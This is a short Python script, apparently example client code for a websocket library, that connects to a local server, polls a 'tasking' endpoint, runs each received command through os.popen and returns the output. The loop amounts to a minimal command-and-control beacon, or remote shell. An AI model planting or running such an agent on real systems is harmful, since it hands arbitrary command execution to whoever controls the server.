#!/usr/bin/env python

import os
import time

from sickserv import SickServWSClient, set_init_key

set_init_key('yellow-submarine')
ssc = SickServWSClient('127.0.0.1', port=1337)

def main():
    ssc.subscribe(endpoint='init')
    ssc.send({'endpoint': 'init'})
    ssc.subscribe(endpoint='tasking')
    ssc.subscribe(endpoint='results')

    while True:
        ssc.send({'endpoint': 'tasking'})
        response = ssc.recv('tasking')
        if not response:
            time.sleep(1)
            continue
        for r in response:
            results = os.popen(r['command']).read()
            ssc.send({'endpoint': 'results', 'results': results})

if __name__ == '__main__':
    main()
